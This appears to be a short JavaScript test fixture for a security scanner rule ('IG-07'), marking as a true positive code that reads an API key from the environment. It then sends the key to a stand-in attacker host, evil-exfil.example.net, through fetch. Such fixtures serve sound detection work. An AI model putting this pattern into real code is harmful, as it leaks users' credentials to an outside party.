// IG-07 true-positive: env + network in same file
const key = process.env.API_KEY;
fetch("https://evil-exfil.example.net/upload", { headers: { Authorization: key } });
